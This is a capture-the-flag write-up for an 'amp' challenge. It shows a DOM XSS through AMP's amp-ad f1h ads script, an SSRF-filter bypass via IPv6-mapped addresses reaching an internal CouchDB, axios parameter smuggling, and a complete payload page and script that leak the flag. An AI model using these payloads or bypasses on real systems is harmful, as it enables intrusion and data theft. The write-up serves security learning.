# amp

## Solution

This challenge is inspired by [XSS in GMail's AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/).

### Part 1

You should find a DOM XSS in AMP. `<amp-ad>` can import a bulk of third-party ads scripts, and I believe there must be at least 1 script can help us. After about 30 minutes, I found one:

```html
  <amp-ad
    width="728"
    height="90"
    type="f1h"
    data-section-id="100"
    data-slot="107"
    data-custom='{"my_custom_param":"my_custom_value"}'
    data-pubnetwork-lib="https://YOUR_WEBSITE"
  >
  </amp-ad>
```

You may be confused because the documentation said the `<amp-ad>` component is only available after import `amp-ad-0.1.js` manually as others components like `<amp-iframe>`. You can read the code [here](https://github.com/ampproject/amphtml/blob/a378126ee4dde944577e0571f53c60fe968be4ec/src/service/extensions-impl.js#L34), it's for compatibility with older versions.

### Part 2.1
The flag is hidden in CouchDB server, and it provides HTTP REST API. You may want to request it directly in browser. As `docker-compose.yml`, the server IP is `172.30.1.3`.

Getting flag by curl is easy:
```bash
/app # curl http://a08f8e0260c64418510cefb2b06eee5cd:bbb@172.30.1.3:5984/a08f8e0260c64418510cefb2b06eee5cd/flag
{"_id":"flag","_rev":"1-25c34c2f8c6567927ede3f02a9ab121b","flag":"flag{123456}"}
```

But in browser it's hard. Requesting this is blocked because of CORS, so the only way is to render the response in the document. If you try to iframe it, or using ``location.href`` to redirect, you will found it had been blocked by Chrome, see [Drop support for embedded credentials in subresource requests.](https://www.chromestatus.com/feature/5669008342777856). So the only way is to request CouchDB through `/validator` with `type=url`.

It has an anti-SSRF measure:
```javascript
const parsed = new URL(url)
// ...
(isIp(host2) && IP.isPublic(host) && IP.isPublic(host2))
```

Check `isPrivate` first, it [implemented as](https://github.com/indutny/node-ip/blob/master/lib/ip.js#L302):
```javascript
ip.isPrivate = function(addr) {
  return /^(::f{4}:)?10\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$/i
      .test(addr) ||
    /^(::f{4}:)?192\.168\.([0-9]{1,3})\.([0-9]{1,3})$/i.test(addr) ||
    /^(::f{4}:)?172\.(1[6-9]|2\d|30|31)\.([0-9]{1,3})\.([0-9]{1,3})$/i
      .test(addr) ||
    /^(::f{4}:)?127\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$/i.test(addr) ||
    /^(::f{4}:)?169\.254\.([0-9]{1,3})\.([0-9]{1,3})$/i.test(addr) ||
    /^f[cd][0-9a-f]{2}:/i.test(addr) ||
    /^fe80:/i.test(addr) ||
    /^::1$/.test(addr) ||
    /^::$/.test(addr);
};
```

It's not hard to bypass, the simplest way is using the long integer representation of IPv4 address. But Nodejs `new URL()` will standardize IP, for example, `http://0` -> `http://0.0.0.0`. So it restricts lots of ways. I used `http://[::ffff:ac1e:0103]` to bypass.


### Part 2.2

You can request CouchDB now, but you can't get the response because it will be validated before screenshot.

You can add a `<script>` tag in response to bypass the `BONUS LIMIT: Only one <script> tag is allowed`:
```bash
/app # curl http://a08f8e0260c64418510cefb2b06eee5cd:bbb@[::ffff:ac1e:0103]:5984/a08f8e0260c64418510cefb2b06eee5cd/_find -XPOST -HContent-Type:application/json -d'{"selector":{},"use_index":["<script>"]}'
{"docs":[
{"_id":"flag","_rev":"1-25c34c2f8c6567927ede3f02a9ab121b","flag":"flag{123456}"}
],
"bookmark": "g1AAAAA4eJzLYWBgYMpgSmHgKy5JLCrJTq2MT8lPzkzJBYqzpOUkpoPkOGBycNEsALDID_E",
"warning": "_design/<script> was not used because it does not contain a valid index for this query.\nNo matching index found, create an index to optimize query time."}
```

That's useless, it still only returns error messages. I think it's impossible to get a JSON pass the AMP validation, but we can embed the flag in the error message if we can add something before the flag.

Test this:
```html
<script></script><meta '"FLAG{{{{12345}}}">
```

The validator will return
```html
Mustache template syntax in attribute name '"flag{{{{12345}}}"' in tag 'meta name= and content='.
```

You can create two new records and use `db/_find` API to sort them to get the result.

```bash
curl -X "PUT" "http://127.0.0.1:5984/a08f8e0260c64418510cefb2b06eee5cd/a" \
     -H 'Content-Type: application/json; charset=utf-8' \
     -u 'a08f8e0260c64418510cefb2b06eee5cd:bbb' \
     -d $'{
  "flag": "<script></script><meta \'"
}'
```
```bash
curl -X "PUT" "http://127.0.0.1:5984/a08f8e0260c64418510cefb2b06eee5cd/z" \
     -H 'Content-Type: application/json; charset=utf-8' \
     -u 'a08f8e0260c64418510cefb2b06eee5cd:bbb' \
     -d $'{"flag": ">"}'
```

Then post ``_find`` to get values:
```bash
root@217480f2deb1:/# curl http://a08f8e0260c64418510cefb2b06eee5cd:bbb@[::ffff:7f00:0001]:5984/a08f8e0260c64418510cefb2b06eee5cd/_find -XPOST -H'Content-Type: application/json' -d'{"selector":{}}'
{"docs":[
{"_id":"a","_rev":"1-40922bdd5cdde7eb134c14d0d43d80fe","flag":"<script></script><meta '"},
{"_id":"flag","_rev":"1-d821640ce988369cf51fd2add85bac89","flag":"flag{t4ke_a_google_amp_screensh0t}"},
{"_id":"z","_rev":"1-66e9445145fbbdf7c44f10929e6a76fd","flag":">"}
],
"bookmark": "g1AAAAAyeJzLYWBgYMpgSmHgKy5JLCrJTq2MT8lPzkzJBYozVoEkOGASEKEsAFFBDas",
"warning": "No matching index found, create an index to optimize query time."}
```

Copy the response to the validator, it will return `The attribute '{"_id":"flag","_rev":"1-d821640ce988369cf51fd2add85bac89","flag":"flag{t4ke_a_google_amp_screensh0t}"},' may not appear in tag 'meta name= and content='.`

### Part 2.3

We can pass a object instead of string as `axios`'s parameter to make a `POST` request. This trick is quite common and has been seen in many CTF challanges such as [RealWorldCTF 2018 PrintMD](https://blog.cal1.cn/post/RealWorldCTF%20PrintMD%20writeup).

```javascript
const serialize = function(obj, prefix) {
  // JSON to querystring
}
await fetch('http://127.0.0.1:3000/validator', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: serialize({
        type: 'url',
        input: {
            url: 'http://a08f8e0260c64418510cefb2b06eee5cd:bbb@[::ffff:ac1e:103]:5984/a08f8e0260c64418510cefb2b06eee5cd/a',
            method: 'put',
            headers: {'Content-Type': 'application/json'},
            data: `{"flag": "<script></script><meta '"}`
        }
    })
})
await fetch('http://127.0.0.1:3000/validator', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: serialize({
        type: 'url',
        input: {
            url: 'http://a08f8e0260c64418510cefb2b06eee5cd:bbb@[::ffff:ac1e:103]:5984/a08f8e0260c64418510cefb2b06eee5cd/z',
            method: 'put',
            headers: {'Content-Type': 'application/json'},
            data: `{"flag": ">"}`
        }
    })
})
```

### Part 2.4

Everything is OK? Let us request ``http://a08f8e0260c64418510cefb2b06eee5cd:bbb@172.30.1.3:5984/a08f8e0260c64418510cefb2b06eee5cd/_find``. It **STILL** fucking shows `BONUS LIMIT`, why?

`axios` is clever enough, if response is a valid JSON, it will auto convert it to a object. `Object.toString() === [object Object]`, so everything is gone. We should try to disable it.

The related code is [here](https://github.com/axios/axios/blob/6642ca9aa1efae47b1a9d3ce3adc98416318661c/lib/defaults.js#L59), it's a default `transformResponse` paramater. We can pass a null `transformResponse` to override it. For example:

```bash
curl -X "POST" "http://127.0.0.1:3000/validator" \
     -H 'Content-Type: application/json; charset=utf-8' \
     -d $'{
  "type": "url",
  "input": {
    "url": "http://a08f8e0260c64418510cefb2b06eee5cd:bbb@[::ffff:ac1e:0103]:5984/a08f8e0260c64418510cefb2b06eee5cd/_find",
    "responseType": "text",
    "transformResponse": null
  }
}'
```

However, our code will be executed on the browser. Due to the lack of a CORS header, we could not pass JSON objects and get response information via the fetch API. Therefore, we have to get the flag by screenshot, and have to pass the parameters to `axios` by form submission. When submitting through a form, the only type is `string`. You can only make `input[transformResponse]` as `"null"`, `"0"`, or `""`.

Maybe you need `input[transformResponse][__proto__]=""`

## Payload

To make it easier for everyone to debug, I added a `window.ctfhelper` into the page. You should type `ctfhelper.timeout = 10000` in DevTool at first.

Copy the following code into the textarea:

```html
<!doctype html>
<html amp lang="en">
  <head>
    <meta charset="utf-8">
    <script async src="https://cdn.ampproject.org/v0.js"></script>
    <title>Hello, AMPs</title>
    <link rel="canonical" href="https://amp.dev/documentation/guides-and-tutorials/start/create/basic_markup/">
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
  </head>
  <body>
    <h1>Welcome to the mobile web</h1>
    <amp-ad
        width="728"
        height="800"
        type="f1h"
        data-section-id="100"
        data-slot="107"
        data-custom='{"my_custom_param":"my_custom_value"}'
        data-pubnetwork-lib="https://YOUR_WEBSITE/YOUR_JS.js"
      >
     </amp-ad>
  </body>
</html>
```

And copy the following code to `YOUR_JS.js`:

```javascript
const serialize = function(obj, prefix) {
  var str = [],
    p;
  for (p in obj) {
    if (obj.hasOwnProperty(p)) {
      var k = prefix ? prefix + "[" + p + "]" : p,
        v = obj[p];
      str.push((v !== null && typeof v === "object") ?
        serialize(v, k) :
        encodeURIComponent(k) + "=" + encodeURIComponent(v));
    }
  }
  return str.join("&");
}

const username = 'bbb'
const database = 'a08f8e0260c64418510cefb2b06eee5cd'
const password = 'bbb'

setTimeout(async () => {

  await fetch('http://127.0.0.1:3000/users/login', {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `username=${username}&password=${password}`
  })

  await fetch('http://127.0.0.1:3000/validator', {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: serialize({
          type: 'url',
          input: {
              url: `http://${database}:${password}@[::ffff:ac1e:103]:5984/${database}/a`,
              method: 'put',
              headers: {'Content-Type': 'application/json'},
              data: `{"flag": "<script></script><meta '"}`
          }
      })
  })

  await fetch('http://127.0.0.1:3000/validator', {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: serialize({
          type: 'url',
          input: {
              url: `http://${database}:${password}@[::ffff:ac1e:103]:5984/${database}/z`,
              method: 'put',
              headers: {'Content-Type': 'application/json'},
              data: `{"flag": ">"}`
          }
      })
  })

document.write(`

<form method="post" action="http://127.0.0.1:3000/validator">
    <input type="hidden" name="type" value="url" />
    <input type="hidden" name="input[url]" value="http://${database}:${password}@[::ffff:ac1e:0103]:5984/${database}/_find"/>
    <input type="hidden" name="input[headers][Content-Type]" value="application/json" />
    <input type="hidden" name="input[method]" value="POST" />
    <input type="hidden" name="input[data]" value='{"selector":{}}'/>
    <input type="hidden" name="input[responseType]" value="text"/>
    <input type="hidden" name="input[transformResponse][__proto__]" value=""/>
</form>
<script>document.forms[0].submit()</scri`+`pt>
`)

}, 0)
```

Then say cheese!

![Screenshot](screenshot.png)

By the way, Natsume Shiki is my waifu.
